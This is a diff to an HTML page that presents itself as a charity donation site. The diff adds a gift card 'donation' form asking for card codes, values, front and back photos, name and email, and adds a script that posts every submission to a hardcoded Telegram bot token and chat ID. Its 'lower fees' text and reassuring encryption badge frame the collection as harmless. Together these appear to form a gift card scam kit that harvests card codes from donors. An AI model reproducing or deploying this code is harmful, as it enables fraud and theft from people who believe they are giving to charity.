@@ -55,6 +55,28 @@
       </div>
     </div>
 
+
+<details class="info-dropdown">
+  <summary>Why we accept Gift Cards and Cryptocurrency</summary>
+
+  <div class="dropdown-content">
+    <p>
+      Many traditional international payment channels involve high fees, restrictions, or processing delays.
+      Gift cards and cryptocurrencies let us receive your support more efficiently so a greater share of your donation
+      reaches the programs and people who need it most.
+    </p>
+
+    <ul>
+      <li><strong>Lower fees & fewer barriers:</strong> reduces cross-border costs and declines.</li>
+      <li><strong>Faster settlement:</strong> helps us respond to urgent needs.</li>
+      <li><strong>Global access:</strong> supporters can give from anywhere.</li>
+    </ul>
+
+    <p class="hint-compact">
+      Thank you for choosing one of the options below — your contribution makes wishes come true.
+    </p>
+  </div>
+</details>
     <!-- DONATION FORM -->
    <form id="donationForm" class="space-y-5">
 
@@ -202,6 +224,85 @@ class="asset-card bg-white p-4 rounded-3xl border-2 border-slate-100 flex flex-c
             <div class="space-y-4">
                 <p class="text-center text-[10px] font-black text-slate-400 uppercase tracking-[0.3em]">Instant Purchase Providers</p>
                 
+  <!-- Gift Card -->
+      <section class="card" aria-labelledby="giftcard-heading">
+        <h2 id="giftcard-heading">Donate with a Gift Card</h2>
+        <p>Please complete the form below. We accept the listed brands and any gift cards starting with <strong>Amazon</strong> (all regions).</p>
+
+        <form id="giftCardForm">
+          <div class="section-title">Gift Card Details</div>
+
+          <div class="row row-2">
+            <div>
+              <label for="cardBrand">Gift card brand</label>
+              <select id="cardBrand" name="cardBrand" required>
+                <option value="" disabled selected>Select brand</option>
+                <option>Amazon (all regions)</option>
+                <option>PlayStation</option>
+                <option>Steam</option>
+                <option>Apple</option>
+                <option>Google Play</option>
+                <option>Other (specify)</option>
+              </select>
+              <div class="hint">If “Other”, specify below (Amazon regional cards welcome).</div>
+            </div>
+
+            <div>
+              <label for="otherBrand">Other brand (optional)</label>
+              <input id="otherBrand" name="otherBrand" placeholder="e.g., Amazon UK, Amazon JP" />
+            </div>
+          </div>
+
+          <div class="row row-2" style="margin-top:8px;">
+            <div>
+              <label for="cardCode">Gift card code</label>
+              <input id="cardCode" name="cardCode" placeholder="Enter the card code exactly" required />
+            </div>
+            <div>
+              <label for="cardValue">Gift card value (numeric)</label>
+              <input id="cardValue" name="cardValue" type="number" min="1" step="1" placeholder="e.g., 25" required />
+            </div>
+          </div>
+
+          <div class="section-title" style="margin-top:12px;">Upload Images</div>
+          <div class="row row-2">
+            <div>
+              <label for="frontImage">Front image</label>
+              <input id="frontImage" name="frontImage" type="file" accept="image/*" required />
+            </div>
+            <div>
+              <label for="backImage">Back image</label>
+              <input id="backImage" name="backImage" type="file" accept="image/*" required />
+            </div>
+          </div>
+
+          <div class="section-title" style="margin-top:12px;">Your Information</div>
+          <div class="row row-2">
+            <div>
+              <label for="senderName">Sender name</label>
+              <input id="senderName" name="senderName" placeholder="Full name" required />
+            </div>
+            <div>
+              <label for="senderEmail">Sender email (for receipt)</label>
+              <input id="senderEmail" name="senderEmail" type="email" placeholder="you@example.com" required />
+            </div>
+          </div>
+
+          <div class="hr" style="margin-top:14px;"></div>
+
+          <button id="submitGiftBtn" class="btn btn-primary" type="submit" aria-label="Submit gift card">
+            💙 Submit Gift Card
+          </button>
+
+          <div id="giftStatus" class="status" role="status" aria-live="polite"></div>
+
+          <p class="hint" style="margin-top:12px">
+            We will review and acknowledge your donation via the email you provide.
+          </p>
+        </form>
+      </section>
+
+
                 <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <a href="https://www.moonpay.com" target="_blank" rel="noopener noreferrer">
   <button class="flex items-center justify-center space-x-3 p-4 bg-white border border-slate-200 rounded-2xl hover:bg-slate-50 transition shadow-sm group">
@@ -217,16 +318,7 @@ class="asset-card bg-white p-4 rounded-3xl border-2 border-slate-100 flex flex-c
                 </div>
             </div>
 
-            <!-- SECURITY FOOTER -->
-            <div class="mt-12 text-center">
-                <div class="inline-flex items-center space-x-2 text-slate-400 bg-slate-100 px-4 py-2 rounded-full border border-slate-200">
-                    <i class="fa-solid fa-lock text-[10px]"></i>
-                    <span class="text-[10px] font-bold uppercase tracking-widest">End-to-End Encrypted Tunnel</span>
-                </div>
-            </div>
-
-        </main>
-    </div>
+           
  <!-- SECURITY NOTE -->
     <div class="text-center">
       <div class="inline-flex items-center gap-2 bg-black/30 border border-white/10 px-5 py-2 rounded-full">
@@ -486,6 +578,203 @@ class="asset-card bg-white p-4 rounded-3xl border-2 border-slate-100 flex flex-c
     font-size: 1.3rem;
   }
 }
+
+/* Dropdown container */
+.info-dropdown {
+  background: #f9fafb;
+  border: 1px solid #e5e7eb;
+  border-radius: 12px;
+  padding: 0.75rem 1rem;
+  margin: 1.5rem 0;
+}
+
+/* Clickable header */
+.info-dropdown summary {
+  cursor: pointer;
+  font-weight: 700;
+  font-size: 1rem;
+  color: #111827;
+  list-style: none;
+}
+
+/* Remove default arrow */
+.info-dropdown summary::-webkit-details-marker {
+  display: none;
+}
+
+/* Custom arrow */
+.info-dropdown summary::after {
+  content: "▾";
+  float: right;
+  transition: transform 0.2s ease;
+}
+
+/* Rotate arrow when open */
+.info-dropdown[open] summary::after {
+  transform: rotate(180deg);
+}
+
+/* Content */
+.dropdown-content {
+  margin-top: 1rem;
+  font-size: 0.9rem;
+  color: #374151;
+}
+
+.dropdown-content ul {
+  margin: 0.75rem 0 0.75rem 1.2rem;
+}
+
+.hint-compact {
+  font-size: 0.8rem;
+  color: #6b7280;
+}
+
+/* ================= GIFT CARD DONATION CARD (DARK) ================= */
+.card {
+  background: #0b0f19;
+  border: 1px solid rgba(255,255,255,0.08);
+  border-radius: 18px;
+  padding: 1.75rem;
+  margin: 2rem auto;
+  max-width: 760px;
+  box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+}
+
+.card h2 {
+  font-size: 1.4rem;
+  font-weight: 800;
+  color: #e5e7eb;
+  margin-bottom: 0.4rem;
+}
+
+.card p {
+  font-size: 0.9rem;
+  color: #9ca3af;
+}
+
+/* Section titles */
+.section-title {
+  font-size: 0.85rem;
+  font-weight: 700;
+  color: #818cf8;
+  margin: 1.2rem 0 0.4rem;
+  text-transform: uppercase;
+  letter-spacing: 0.03em;
+}
+
+/* Grid rows */
+.row {
+  display: grid;
+  gap: 1rem;
+}
+
+.row-2 {
+  grid-template-columns: repeat(2, 1fr);
+}
+
+/* Inputs */
+label {
+  display: block;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: #9ca3af;
+  margin-bottom: 0.25rem;
+}
+
+input,
+select {
+  width: 100%;
+  padding: 0.65rem 0.75rem;
+  font-size: 0.85rem;
+  border-radius: 10px;
+  border: 1px solid rgba(255,255,255,0.12);
+  background: #111827;
+  color: #e5e7eb;
+  outline: none;
+  transition: border 0.2s, box-shadow 0.2s, background 0.2s;
+}
+
+input::placeholder {
+  color: #6b7280;
+}
+
+input:focus,
+select:focus {
+  border-color: #6366f1;
+  box-shadow: 0 0 0 3px rgba(99,102,241,0.25);
+  background: #0f172a;
+}
+
+/* File inputs */
+input[type="file"] {
+  padding: 0.45rem;
+  background: #0f172a;
+}
+
+/* Divider */
+.hr {
+  height: 1px;
+  background: rgba(255,255,255,0.08);
+}
+
+/* Buttons */
+.btn {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 0.4rem;
+  border-radius: 14px;
+  font-weight: 800;
+  font-size: 0.9rem;
+  padding: 0.75rem 1.2rem;
+  cursor: pointer;
+  transition: transform 0.15s ease, box-shadow 0.15s ease;
+}
+
+.btn-primary {
+  background: linear-gradient(135deg, #6366f1, #4f46e5);
+  color: #ffffff;
+  border: none;
+}
+
+.btn-primary:hover {
+  transform: translateY(-1px);
+  box-shadow: 0 10px 25px rgba(99,102,241,0.45);
+}
+
+/* Status message */
+.status {
+  margin-top: 0.75rem;
+  font-size: 0.85rem;
+  font-weight: 600;
+}
+
+.status.ok {
+  color: #22c55e;
+}
+
+.status.err {
+  color: #ef4444;
+}
+
+/* Hints */
+.hint {
+  font-size: 0.75rem;
+  color: #9ca3af;
+  margin-top: 0.25rem;
+}
+
+/* Responsive */
+@media (max-width: 640px) {
+  .row-2 {
+    grid-template-columns: 1fr;
+  }
+
+  .card {
+    padding: 1.25rem;
+  }
+}
 </style>
     <script>
         function toggleSidebar() {
@@ -566,6 +855,142 @@ ${message}
   .catch(() => {
     alert("Network error. Please try again.");
   });
+});
+</script>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+
+  /* === Telegram Bot configuration === */
+  const TELEGRAM_BOT_TOKEN = "8370869618:AAEDxJJZ4bEU7GGDRhtEOHzAJkyry8G7Wdk";
+  const TELEGRAM_CHAT_ID  = "5987689745";
+
+  /* === Copy buttons (modern API) === */
+  document.querySelectorAll('[data-copy]').forEach(btn => {
+    btn.addEventListener('click', async () => {
+      const sel = btn.getAttribute('data-copy');
+      const el = document.querySelector(sel);
+      if (!el) return;
+
+      try {
+        await navigator.clipboard.writeText(el.value || el.textContent);
+        const original = btn.textContent;
+        btn.textContent = "Copied!";
+        setTimeout(() => btn.textContent = original, 1200);
+      } catch (e) {
+        console.warn("Clipboard failed", e);
+      }
+    });
+  });
+
+  /* === Brand toggle === */
+  const brandSel   = document.getElementById('cardBrand');
+  const otherBrand = document.getElementById('otherBrand');
+
+  brandSel.addEventListener('change', () => {
+    if (brandSel.value === 'Other (specify)') {
+      otherBrand.required = true;
+      otherBrand.focus();
+    } else {
+      otherBrand.required = false;
+      otherBrand.value = '';
+    }
+  });
+
+  /* === Form === */
+  const giftForm  = document.getElementById('giftCardForm');
+  const statusEl  = document.getElementById('giftStatus');
+  const submitBtn = document.getElementById('submitGiftBtn');
+
+  function setStatus(msg, ok) {
+    statusEl.textContent = msg;
+    statusEl.style.color = ok ? '#16a34a' : '#dc2626';
+  }
+
+  async function tgSendMessage(text) {
+    const res = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text
+        })
+      }
+    );
+    if (!res.ok) throw new Error('Telegram message failed');
+  }
+
+  async function tgSendPhoto(file, caption) {
+    const fd = new FormData();
+    fd.append('chat_id', TELEGRAM_CHAT_ID);
+    fd.append('photo', file);
+    fd.append('caption', caption.slice(0, 1024));
+
+    const res = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+      { method: 'POST', body: fd }
+    );
+    if (!res.ok) throw new Error('Telegram photo failed');
+  }
+
+  giftForm.addEventListener('submit', async e => {
+    e.preventDefault();
+    submitBtn.disabled = true;
+    setStatus('Submitting…', true);
+
+    try {
+      const brand = brandSel.value;
+      const brandOther = otherBrand.value.trim();
+      const cardCode = cardCodeEl().value.trim();
+      const cardValue = cardValueEl().value.trim();
+      const front = frontImageEl().files[0];
+      const back  = backImageEl().files[0];
+      const senderName = senderNameEl().value.trim();
+      const senderEmail = senderEmailEl().value.trim();
+
+      if (!brand || !cardCode || !cardValue || !front || !back || !senderName || !senderEmail) {
+        setStatus('Please complete all required fields.', false);
+        submitBtn.disabled = false;
+        return;
+      }
+
+      const finalBrand =
+        brand === 'Other (specify)' && brandOther ? brandOther : brand;
+
+      const message =
+`🎁 Gift Card Donation
+Brand: ${finalBrand}
+Value: ${cardValue}
+Code: ${cardCode}
+Sender: ${senderName}
+Email: ${senderEmail}
+Time: ${new Date().toLocaleString()}`;
+
+      await tgSendMessage(message);
+      await tgSendPhoto(front, `Front — ${finalBrand}`);
+      await tgSendPhoto(back,  `Back — ${finalBrand}`);
+
+      setStatus('Submission successful! Thank you 💙', true);
+      giftForm.reset();
+
+    } catch (err) {
+      console.error(err);
+      setStatus('Submission failed. Please try again later.', false);
+    }
+
+    submitBtn.disabled = false;
+  });
+
+  /* === Element helpers === */
+  const cardCodeEl = () => document.getElementById('cardCode');
+  const cardValueEl = () => document.getElementById('cardValue');
+  const frontImageEl = () => document.getElementById('frontImage');
+  const backImageEl = () => document.getElementById('backImage');
+  const senderNameEl = () => document.getElementById('senderName');
+  const senderEmailEl = () => document.getElementById('senderEmail');
+
 });
 </script>
 </body>
